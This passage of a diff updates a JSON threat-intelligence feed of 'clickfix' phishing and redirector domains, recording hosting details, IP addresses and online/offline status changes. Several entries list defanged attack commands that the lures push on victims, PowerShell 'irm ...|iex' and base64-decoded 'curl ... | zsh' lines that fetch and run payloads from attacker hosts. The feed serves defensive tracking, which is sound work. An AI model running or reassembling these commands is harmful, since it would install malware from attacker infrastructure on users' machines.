     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
+    "trek-72.com",
     "t-trustrest.com",
-    "trek-72.com"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -162935,11 +162996,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-18",
    "last_seen": "2026-10-22",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://msbusinesscentre.com/",
    "brand": null,
    "product": null,
@@ -162961,7 +163022,7 @@
    "hosts": [
     {
      "host": "msbusinesscentre.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-18",
      "last_seen": "2026-10-22"
     }
@@ -162981,11 +163042,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-30",
    "last_seen": "2026-10-31",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "http://msevietnam.com/",
    "brand": null,
    "product": null,
@@ -163007,7 +163068,7 @@
    "hosts": [
     {
      "host": "msevietnam.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-30",
      "last_seen": "2026-10-31"
     }
@@ -163324,7 +163385,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-29",
-   "last_seen": "2026-11-01",
+   "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
    "offline_since": null,
    "url": "https://mts-tiling-solutions.de/",
@@ -163332,24 +163393,24 @@
    "product": null,
    "hosting": "Hetzner",
    "dns": "sicor-kdl.net",
-   "ip": "195.201.118.194",
+   "ip": "2a01:4f8:c2c:5f72::1",
    "asn": "AS24940",
    "org": "HETZNER-AS Hetzner Online GmbH, DE",
    "country": "DE",
    "ips": [
+    {
+     "ip": "2a01:4f8:c2c:5f72::1",
+     "asn": "AS24940",
+     "org": "HETZNER-AS Hetzner Online GmbH, DE",
+     "first_seen": "2026-10-29",
+     "last_seen": "2026-11-03"
+    },
     {
      "ip": "195.201.118.194",
      "asn": "AS24940",
      "org": "HETZNER-AS Hetzner Online GmbH, DE",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-01"
-    },
-    {
-     "ip": "2a01:4f8:c2c:5f72::1",
-     "asn": "AS24940",
-     "org": "HETZNER-AS Hetzner Online GmbH, DE",
-     "first_seen": "2026-10-29",
-     "last_seen": "2026-10-31"
     }
    ],
    "hosts": [
@@ -163357,7 +163418,7 @@
      "host": "mts-tiling-solutions.de",
      "status": "online",
      "first_seen": "2026-10-29",
-     "last_seen": "2026-11-01"
+     "last_seen": "2026-11-03"
     }
    ],
    "actor": null,
@@ -164847,11 +164908,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-20",
    "last_seen": "2026-10-21",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://myhandymansite.com/",
    "brand": null,
    "product": null,
@@ -164873,7 +164934,7 @@
    "hosts": [
     {
      "host": "myhandymansite.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-20",
      "last_seen": "2026-10-21"
     }
@@ -167974,11 +168035,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-11-01",
    "last_seen": "2026-11-01",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://nguyenvanhoafood.com/",
    "brand": null,
    "product": null,
@@ -168000,7 +168061,7 @@
    "hosts": [
     {
      "host": "nguyenvanhoafood.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-01"
     }
@@ -168132,11 +168193,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-26",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://nhconsulting-group.com/",
    "brand": null,
    "product": null,
@@ -168158,7 +168219,7 @@
    "hosts": [
     {
      "host": "nhconsulting-group.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-26",
      "last_seen": "2026-11-03"
     }
@@ -168831,11 +168892,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-22",
    "last_seen": "2026-10-23",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://www.nmrgroupinc.com/",
    "brand": null,
    "product": null,
@@ -168857,7 +168918,7 @@
    "hosts": [
     {
      "host": "www.nmrgroupinc.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-22",
      "last_seen": "2026-10-23"
     }
@@ -169773,11 +169834,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
+    "trek-72.com",
     "t-trustrest.com",
-    "trek-72.com"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -172611,15 +172673,16 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
    ],
    "connects_to": [
     "xorados.com",
     "t-trustrest.com",
     "groverudder12.com",
     "hagosuro.lc",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -172887,11 +172950,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-11-01",
    "last_seen": "2026-11-01",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://oretvaleurs.fr/",
    "brand": null,
    "product": null,
@@ -172913,7 +172976,7 @@
    "hosts": [
     {
      "host": "oretvaleurs.fr",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-01"
     }
@@ -173943,7 +174006,7 @@
     },
     {
      "host": "www.oztutustekstil.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-19",
      "last_seen": "2026-10-19"
     }
@@ -174666,11 +174729,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-25",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://paolettiboutique.it/",
    "brand": null,
    "product": null,
@@ -174699,7 +174762,7 @@
    "hosts": [
     {
      "host": "paolettiboutique.it",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-25",
      "last_seen": "2026-11-03"
     }
@@ -176419,57 +176482,6 @@
    "lure_from": []
   },
   {
-   "indicator": "penyabarcelonistavilanova.cat",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-18",
-   "last_seen": "2026-11-03",
-   "last_online": "2026-11-03",
-   "offline_since": null,
-   "url": "https://www.penyabarcelonistavilanova.cat/",
-   "brand": null,
-   "product": null,
-   "hosting": "CDmon 10dencehispahard",
-   "dns": "cdmon.net",
-   "ip": "134.0.9.86",
-   "asn": "AS197712",
-   "org": "CDmon 10dencehispahard, S.L., ES",
-   "country": "ES",
-   "ips": [
-    {
-     "ip": "134.0.9.86",
-     "asn": "AS197712",
-     "org": "CDmon 10dencehispahard, S.L., ES",
-     "first_seen": "2026-10-18",
-     "last_seen": "2026-11-03"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "www.penyabarcelonistavilanova.cat",
-     "status": "online",
-     "first_seen": "2026-10-18",
-     "last_seen": "2026-11-03"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'cloud-browse[.]codes/[id]'|iex;",
-    "irm 'verifing-server[.]codes/[id]'|iex;",
-    "irm 'code[.]nvc-info[.]beer/[id]'|iex;"
-   ],
-   "connects_to": [
-    "cloud-browse.codes",
-    "verifing-server.codes",
-    "code.nvc-info.beer"
-   ],
-   "lure_from": []
-  },
-  {
    "indicator": "peq.com.mx",
    "type": "domain",
    "category": "clickfix",
@@ -176621,11 +176633,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-21",
    "last_seen": "2026-10-26",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://www.perleonlus.it/",
    "brand": null,
    "product": null,
@@ -176647,7 +176659,7 @@
    "hosts": [
     {
      "host": "www.perleonlus.it",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-21",
      "last_seen": "2026-10-26"
     }
@@ -186167,11 +186179,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
+    "trek-72.com",
     "t-trustrest.com",
-    "trek-72.com"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -187284,11 +187297,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-31",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://raybet.tech/",
    "brand": null,
    "product": null,
@@ -187324,7 +187337,7 @@
    "hosts": [
     {
      "host": "raybet.tech",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-31",
      "last_seen": "2026-11-03"
     }
@@ -189490,11 +189503,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-11-02",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://renewmedspabeauty.com/",
    "brand": null,
    "product": null,
@@ -189516,7 +189529,7 @@
    "hosts": [
     {
      "host": "renewmedspabeauty.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-11-02",
      "last_seen": "2026-11-03"
     }
@@ -193998,11 +194011,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
+    "trek-72.com",
     "t-trustrest.com",
-    "trek-72.com"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -195480,11 +195494,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-26",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://rulinz.com/contactez-nous/",
    "brand": null,
    "product": null,
@@ -195513,7 +195527,7 @@
    "hosts": [
     {
      "host": "rulinz.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-26",
      "last_seen": "2026-11-03"
     }
@@ -200739,11 +200753,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-11-01",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://sbimarketingco.com/",
    "brand": null,
    "product": null,
@@ -200891,7 +200905,7 @@
    "hosts": [
     {
      "host": "sbimarketingco.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-03"
     }
@@ -207508,15 +207522,16 @@
    "actor_link": null,
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null"
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
-    "t-trustrest.com",
     "xorados.com",
+    "t-trustrest.com",
     "groverudder12.com",
     "hagosuro.lc",
-    "trek-72.com"
+    "trek-72.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -208819,12 +208834,13 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
     "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
-    "t-trustrest.com",
     "xorados.com",
-    "trek-72.com"
+    "trek-72.com",
+    "t-trustrest.com",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -217201,11 +217217,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-25",
    "last_seen": "2026-10-25",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://www.stpi.eu/",
    "brand": null,
    "product": null,
@@ -217227,7 +217243,7 @@
    "hosts": [
     {
      "host": "www.stpi.eu",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-25",
      "last_seen": "2026-10-25"
     }
@@ -218577,11 +218593,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-31",
    "last_seen": "2026-11-01",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://sufaraalhedaya.com/",
    "brand": null,
    "product": null,
@@ -218603,7 +218619,7 @@
    "hosts": [
     {
      "host": "sufaraalhedaya.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-31",
      "last_seen": "2026-11-01"
     }
@@ -223054,11 +223070,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-29",
    "last_seen": "2026-10-29",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://tandissrl.com/",
    "brand": null,
    "product": null,
@@ -223080,7 +223096,7 @@
    "hosts": [
     {
      "host": "tandissrl.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-29"
     }
@@ -235260,11 +235276,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-31",
    "last_seen": "2026-11-01",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://trendingbangladesh.com/",
    "brand": null,
    "product": null,
@@ -235300,7 +235316,7 @@
    "hosts": [
     {
      "host": "trendingbangladesh.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-31",
      "last_seen": "2026-11-01"
     }
@@ -239153,11 +239169,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-31",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://uk-airport-car-parking.co.uk/",
    "brand": null,
    "product": null,
@@ -239207,7 +239223,7 @@
    "hosts": [
     {
      "host": "uk-airport-car-parking.co.uk",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-31",
      "last_seen": "2026-11-03"
     }
@@ -239311,8 +239327,8 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
     "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
@@ -239321,7 +239337,8 @@
     "hagosuro.lc",
     "groverudder12.com",
     "trek-72.com",
-    "zurggoyttjof21.cc"
+    "zurggoyttjof21.cc",
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at",
@@ -241521,62 +241538,6 @@
    ],
    "lure_from": [
     "btorsercoyt31.cc"
-   ]
-  },
-  {
-   "indicator": "vada.se",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-20",
-   "last_seen": "2026-10-21",
-   "last_online": "2026-11-03",
-   "offline_since": null,
-   "url": "https://vada.se/",
-   "brand": null,
-   "product": null,
-   "hosting": "ONECOM One.com A/S",
-   "dns": "one.com",
-   "ip": "77.111.241.85",
-   "asn": "AS51468",
-   "org": "ONECOM One.com A/S, DK",
-   "country": "DK",
-   "ips": [
-    {
-     "ip": "77.111.241.85",
-     "asn": "AS51468",
-     "org": "ONECOM One.com A/S, DK",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-10-21"
-    },
-    {
-     "ip": "2a02:2350:5:104:ae:9af4:a39b:babb",
-     "asn": "AS51468",
-     "org": "ONECOM One.com A/S, DK",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-10-20"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "vada.se",
-     "status": "online",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-10-21"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "iex(irm 'hxxps[:]//cosmical2049[.]com/wordpresscheck/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})"
-   ],
-   "connects_to": [
-    "cosmical2049.com"
-   ],
-   "lure_from": [
-    "interseq.at"
    ]
   },
   {
@@ -246745,11 +246706,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-11-02",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://vlrsolar.com.br/",
    "brand": null,
    "product": null,
@@ -246792,7 +246753,7 @@
    "hosts": [
     {
      "host": "vlrsolar.com.br",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-11-02",
      "last_seen": "2026-11-03"
     }
@@ -255443,11 +255404,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-31",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://xoso88.ink/",
    "brand": null,
    "product": null,
@@ -255490,7 +255451,7 @@
    "hosts": [
     {
      "host": "xoso88.ink",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-31",
      "last_seen": "2026-11-03"
     }
@@ -255516,11 +255477,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "online",
+   "status": "offline",
    "first_seen": "2026-10-31",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": null,
+   "offline_since": "2026-11-03",
    "url": "https://xs88.club/",
    "brand": null,
    "product": null,
@@ -255556,7 +255517,7 @@
    "hosts": [
     {
      "host": "xs88.club",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-31",
      "last_seen": "2026-11-03"
     }
@@ -255726,66 +255687,6 @@
     "id-dns.net"
    ],
    "lure_from": []
-  },
-  {
-   "indicator": "yaaneesglamourlashes.com",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-30",
-   "last_seen": "2026-11-03",
-   "last_online": "2026-11-03",
-   "offline_since": null,
-   "url": "https://yaaneesglamourlashes.com/[redacted]/",
-   "brand": "Microsoft",
-   "product": null,
-   "hosting": "Oracle Cloud",
-   "dns": "Newfold",
-   "ip": "192.124.249.28",
-   "asn": "AS30148",
-   "org": "SUCURI-SEC - Sucuri, US",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "192.124.249.28",
-     "asn": "AS30148",
-     "org": "SUCURI-SEC - Sucuri, US",
-     "first_seen": "2026-11-03",
-     "last_seen": "2026-11-03"
-    },
-    {
-     "ip": "162.144.14.68",
-     "asn": "AS31898",
-     "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
-     "first_seen": "2026-10-30",
-     "last_seen": "2026-11-03"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "yaaneesglamourlashes.com",
-     "status": "online",
-     "first_seen": "2026-10-30",
-     "last_seen": "2026-11-03"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//xorados[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
-    "(irm 'hxxps[:]//xorados[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex"
-   ],
-   "connects_to": [
-    "xorados.com",
-    "groverudder12.com",
-    "trek-72.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
   },
   {
    "indicator": "yael-marketing.com",
@@ -256270,11 +256171,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Phishing page",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-26",
    "last_seen": "2026-11-03",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://www.yazaboza.com.tr/",
    "brand": null,
    "product": null,
@@ -256296,7 +256197,7 @@
    "hosts": [
     {
      "host": "www.yazaboza.com.tr",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-26",
      "last_seen": "2026-11-03"
     }
@@ -256581,11 +256482,11 @@
    "category": "clickfix",
    "campaign": null,
    "role": "Redirector",
-   "status": "offline",
+   "status": "online",
    "first_seen": "2026-10-21",
    "last_seen": "2026-10-22",
    "last_online": "2026-11-03",
-   "offline_since": "2026-11-03",
+   "offline_since": null,
    "url": "https://yesaccompagnement.fr/",
    "brand": null,
    "product": null,
@@ -256607,7 +256508,7 @@
    "hosts": [
     {
      "host": "yesaccompagnement.fr",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-21",
      "last_seen": "2026-10-22"
     }
